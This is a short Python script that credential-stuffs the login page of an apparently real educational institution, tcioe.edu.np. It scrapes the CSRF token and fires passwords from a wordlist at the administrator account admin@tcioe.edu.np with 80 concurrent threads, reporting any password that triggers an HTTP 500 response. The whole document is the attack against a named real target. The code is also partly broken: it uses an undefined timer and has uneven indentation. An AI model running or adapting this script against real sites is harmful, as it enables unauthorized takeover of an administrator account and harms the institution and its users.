import requests
from bs4 import BeautifulSoup as bs4
from concurrent.futures import ThreadPoolExecutor

r = requests.Session()

url = "https://tcioe.edu.np/login"

target_email = "admin@tcioe.edu.np"

password_list = [pwd.strip() for pwd in open("password_list.txt", "r")]

CSRF_token = str(bs4(str(r.get(url).text), 'html.parser').select_one('input[name="_token"]')).split("value=\"")[1].split("\"")[0].strip()

def check_password(password):
	return (r.post(url, data = {
    	"_token" : CSRF_token,
    	"email" : target_email,
    	"password" : password
	}), password)


with ThreadPoolExecutor(max_workers=80) as e:
	results = e.map(check_password, password_list)
	for resp, pwd in results:
    	if(resp.status_code == 500):
        	print(f"Password Found: {pwd}")
          print("Elapsed Time: ", round(float(time.process_time() - t), 5))
